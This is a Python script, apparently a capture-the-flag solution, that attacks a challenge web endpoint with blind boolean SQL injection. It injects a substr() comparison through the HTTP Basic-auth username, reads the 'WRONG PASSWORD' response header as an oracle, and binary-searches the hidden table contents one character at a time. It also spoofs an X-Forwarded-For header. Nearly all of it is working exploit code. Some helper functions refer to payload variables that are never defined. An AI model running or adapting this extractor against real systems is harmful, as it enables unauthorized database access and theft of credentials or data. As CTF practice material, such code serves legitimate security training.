import requests, urllib, re, sys, base64
import random, string


url_base = "http://ecsm2017.cert.pl:6044/index.php/instructions"
url_login = url_base
url_payload = url_base

sessid = requests.Session()

init_array = []
sillent = False
fancy_console = False

ASCIIAlphabet = "\001 !\"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`abcdefghijklmnopqrstuvwxyz{|}~"
simpleAlphabet = "\001abcdefghijklmnopqrstuvwxyz"
HEXAlphabet = "\001-0123456789abcdef"
advancedAlphabet= "\0010123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_abcdefghijklmnopqrstuvwxyz"


flag_payload = "a' or substr((select message from instructions), @wOFFSET@,1)>'@cORD@"

headers = {'X-Forwarded-For': '175.45.176.1'}

def printInPlace(alert):
	if fancy_console:
		sys.stdout.write("{}{}".format(alert, "\b"*len(alert)))
		sys.stdout.flush();
	return fancy_console

def createPayload( query ):
	return (query, 'aaa')

def sendPayload ( query ):
	if sillent == False: print ("exec: {}".format(query))
	payload = createPayload(query)
	add = requests.get(url_payload, auth=payload, allow_redirects=False, headers=headers)
	return findIDs(add.headers)

def logIn():
	print ("loggin in: ")
	sessid.get(url_login, allow_redirects=True)
	return

def findIDs(text):
	return text

def tryPayload(str):
	headers = sendPayload(str)
	return 'Basic realm="WRONG PASSWORD"' == headers['WWW-Authenticate']

#bin-search ASCII inside [alphabet]
def findName(payload, alphabet):
	a = 0
	b = len(alphabet)-1
	while (a < b):
		mid = (a+b)//2
		c = alphabet[mid]
		printInPlace(c)
		if tryPayload(payload
			.replace("@cORD@", c)
			): a = mid + 1
		else:
			b = mid
	return alphabet[a]


def findNames(payload, alphabet):
	for result_offset in range(0, 1000):
		result = ""
		pl = payload.replace("@rOFFSET@", str(result_offset))
		for word_offset in range(1, 40):
			pl2 = pl.replace("@wOFFSET@", str(word_offset))
			c = findName(pl2, alphabet)
			if c == alphabet[0]: break
			sys.stdout.write(c)
			sys.stdout.flush
			result+=c
		print(" ")
		if len(result) <= 0: break
	return




def findTables():
	print ("..:: Searching for table names ::..")
	findNames(tables_payload, ASCIIAlphabet)

def findSpiesrColumns():
	print ("..:: Searching for column names in user ::..")
	findNames(columns_spies_payload, advancedAlphabet)

def findCtfColumns():
	print ("..:: Searching for column names in point::..")
	findNames(columns_ctf_payload, advancedAlphabet)


def findFlag():
	print ("..:: Searching for Admin hash ::..")
	findNames(flag_payload, ASCIIAlphabet)



fancy_console = True # Turn on fancy terminal output
sillent = True # Turn off debugging mode


# findTables();
findFlag();



# 08e0d3fa-7fe7-4157-94ab-724f07190840